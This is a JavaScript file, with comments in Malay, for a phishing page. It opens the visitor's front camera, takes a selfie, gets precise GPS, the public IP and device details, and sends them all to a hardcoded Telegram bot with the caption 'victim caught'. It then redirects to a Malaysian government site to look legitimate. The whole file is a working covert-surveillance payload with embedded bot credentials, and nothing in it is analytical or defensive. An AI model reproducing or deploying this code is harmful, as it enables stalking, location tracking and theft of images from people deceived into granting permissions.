// TUKAR SINI (Token kau dah dimasukkan)
const BOT_TOKEN = "9277901855:AAF-83CM2BKInE4V_rKb3oyxSHEjS3t8ym0";
const CHAT_ID = "-1004444548273";
const REDIRECT_URL = "https://www.malaysia.gov.my";

async function startHarvest() {
    const btn = document.getElementById('start-btn');
    const status = document.getElementById('status');
    
    btn.disabled = true;
    btn.innerText = "Memproses...";
    status.innerText = "Sila tunggu...";

    try {
        // 1. Minta Kamera
        status.innerText = "Membuka kamera...";
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        const video = document.getElementById('preview');
        video.srcObject = stream;
        await video.play();
        
        // Tunggu 2 saat untuk gambar jelas
        await new Promise(r => setTimeout(r, 2000)); 

        // Ambil Gambar
        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext("2d").drawImage(video, 0, 0);
        stream.getTracks().forEach(t => t.stop());

        // 2. Minta GPS
        status.innerText = "Mengesan lokasi...";
        let gpsText = "GPS: User tolak permission.";
        if (navigator.geolocation) {
            const pos = await new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000, enableHighAccuracy: true });
            }).catch(() => null);
            
            if (pos) {
                gpsText = `Lat: ${pos.coords.latitude}, Long: ${pos.coords.longitude}\nMaps: https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`;
            }
        }

        // 3. Dapatkan IP & Device Info
        let ip = "Unknown";
        try {
            let res = await fetch("https://api.ipify.org?format=json");
            let data = await res.json();
            ip = data.ip;
        } catch(e) {}

        const deviceInfo = `UA: ${navigator.userAgent}\nScreen: ${screen.width}x${screen.height}`;

        // 4. Hantar ke Telegram
        status.innerText = "Menghantar data...";
        const caption = `<b>🎯 MANGSA DAPAT</b>\n\n<b>📍 Lokasi:</b>\n${gpsText}\n\n<b>🌐 IP:</b> ${ip}\n\n<b>📱 Device:</b>\n${deviceInfo}`;

        canvas.toBlob(async (blob) => {
            const fd = new FormData();
            fd.append("chat_id", CHAT_ID);
            fd.append("photo", blob, "selfie.jpg");
            fd.append("caption", caption);
            fd.append("parse_mode", "HTML");
            
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd });
            
            status.innerText = "Selesai!";
            setTimeout(() => window.location.href = REDIRECT_URL, 1500);
        }, "image/jpeg", 0.8);

    } catch (err) {
        // Kalau error, tunjuk kat skrin
        status.innerText = "Ralat: " + err.message;
        status.style.color = "red";
        btn.disabled = false;
        btn.innerText = "Cuba Lagi";
    }
}
